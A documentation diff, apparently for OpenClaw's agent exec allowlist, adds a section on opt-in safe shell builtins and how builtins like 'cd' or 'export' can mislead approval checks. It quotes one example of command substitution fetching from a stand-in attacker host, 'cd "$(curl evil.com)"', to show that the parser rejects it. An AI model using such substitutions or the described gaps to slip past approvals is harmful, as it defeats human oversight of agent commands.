@@ -143,6 +143,54 @@ If you explicitly opt `jq` into `safeBins`, OpenClaw still rejects the `env` bui
 mode so `jq -n env` cannot dump the host process environment without an explicit allowlist path
 or approval prompt.
 
+## Safe shell builtins (opt-in)
+
+POSIX shell builtins like `cd`, `pwd`, `export`, and `unset` have no resolvable filesystem
+path, so they always miss the allowlist regardless of which binaries are listed. Even after
+allowlisting `/usr/bin/bash`, a chained command like `cd /path && git status` still gates on
+the `cd` segment.
+
+`tools.exec.safeBuiltins` is an opt-in list of builtins that auto-allow without a path
+resolution. The conservative default set (stateless, no shell-state mutation) is:
+
+`:`, `false`, `pwd`, `true`
+
+Additional supported names you can opt into explicitly if you accept the cwd/env-mutation
+trade-off (see "State-mutating builtins" below):
+
+`cd`, `export`, `unset`
+
+These seven names form the full supported set. Anything else you configure is silently
+dropped at normalization — including `eval`, `source`, and `.` (they evaluate arbitrary
+shell code; auto-allowing them would defeat the allowlist by letting a configured-as-safe
+builtin run a different non-safe binary) and `echo` / `printf` (shell-builtin variants
+differ across shells; the `/usr/bin/echo` / `/usr/bin/printf` binaries can be allowlisted
+via `safeBins` if needed).
+
+### State-mutating builtins
+
+`cd`, `export`, and `unset` are supported but **not** in the conservative default. The
+allowlist evaluator resolves each segment against the original cwd/env, so auto-allowing
+them can approve a different executable than the one the shell eventually runs after the
+mutation. Enable them only when you accept that trade-off for your workflow.
+
+Off by default. Enable per-agent or globally:
+
+```jsonc
+{
+  "tools": {
+    "exec": {
+      "security": "allowlist",
+      "safeBuiltins": ["cd", "pwd", "export", "unset", "true", "false", ":"],
+    },
+  },
+}
+```
+
+`safeBuiltins` is POSIX-only — on Windows hosts (PowerShell) the option is ignored.
+Command substitution (`$()` / backticks) is still rejected during allowlist parsing, so
+arguments like `cd "$(curl evil.com)"` cannot bypass approvals through builtin segments.
+
 ## Interpreter/runtime commands
 
 Approval-backed interpreter/runtime runs are intentionally conservative:
